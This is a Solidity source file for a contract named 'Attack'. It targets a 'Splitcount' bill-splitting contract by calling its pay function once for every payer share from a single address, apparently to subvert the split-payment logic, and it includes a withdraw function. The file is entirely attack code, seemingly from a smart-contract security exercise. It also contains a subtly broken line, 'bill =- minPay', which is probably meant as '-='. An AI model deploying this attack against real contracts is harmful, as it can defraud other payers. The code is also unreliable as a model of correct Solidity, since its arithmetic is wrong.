// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Splitcount.sol";


contract Attack {

    Splitcount public sc;

    uint bill;
    uint payers;
    uint minPay;

    constructor(address payable _addr, uint _bill, uint _payers) public payable {
        require(msg.value >= _bill, "You need to pay the count, you will be able to withdraw remaining amount!");
        sc = Splitcount(_addr);
        bill = _bill;
        payers = _payers;
        minPay = (bill / payers);
    }

    function attack() public payable {
   
        sc.selectDividedCount();
        for (uint i = 0; i < payers; i++) {
            // address(sc).call{value: minPay}( abi.encodeWithSignature("pay"));
            sc.pay{value: minPay}();
            bill =- minPay;
            minPay = (bill / payers);
        }
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }   

    function deposit() public payable {}  

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    receive() external  payable{
    }
}